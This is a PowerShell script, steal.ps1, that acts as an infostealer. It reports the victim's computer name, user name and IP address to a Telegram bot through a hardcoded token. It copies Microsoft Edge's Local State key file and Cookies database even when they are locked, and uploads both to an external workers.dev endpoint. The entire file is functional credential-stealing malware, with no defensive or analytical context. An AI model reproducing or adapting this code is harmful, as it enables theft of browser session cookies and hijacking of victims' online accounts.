# steal.ps1
# Reads Edge Local State and Cookies.db directly (works even if locked).

$t = "8940444810:AAHeKIwsLgAI2o7H20984vi_1K-yEI2J3k8"
$c = "6760965981"
$worker_url = "https://reciever.tyceno89.workers.dev"

# --- Send PC info to Telegram ---
$ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
$body = @{ chat_id = $c; text = "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip" }
Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body

# --- Function to read file bytes with shared access ---
function Read-FileWithSharedAccess {
    param($path)
    try {
        $fileStream = [System.IO.File]::Open($path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $bytes = New-Object byte[] $fileStream.Length
        $fileStream.Read($bytes, 0, $bytes.Length) | Out-Null
        $fileStream.Close()
        return $bytes
    } catch {
        return $null
    }
}

# --- 1) Read Local State (rarely locked) ---
$src_ls = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
$bytes_ls = Read-FileWithSharedAccess $src_ls
if ($bytes_ls) {
    $b64_ls = [Convert]::ToBase64String($bytes_ls)
} else {
    $body = @{ chat_id = $c; text = "ERROR: Could not read Local State" }
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
    exit
}

# --- 2) Read Cookies.db (often locked) ---
$src_cookies = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
$bytes_cookies = Read-FileWithSharedAccess $src_cookies
if (-not $bytes_cookies) {
    $body = @{ chat_id = $c; text = "ERROR: Could not read Cookies.db" }
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
    exit
}
$b64_cookies = [Convert]::ToBase64String($bytes_cookies)

# --- 3) Send both files to worker ---
$payload = @{
    pc = $env:COMPUTERNAME
    user = $env:USERNAME
    files = @{
        "Edge_LocalState.json" = $b64_ls
        "Edge_Cookies.db" = $b64_cookies
    }
} | ConvertTo-Json -Depth 10

try {
    Invoke-RestMethod -Uri $worker_url -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop
    $body = @{ chat_id = $c; text = "Both files sent successfully" }
} catch {
    $body = @{ chat_id = $c; text = "ERROR sending to worker: $_" }
}
Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
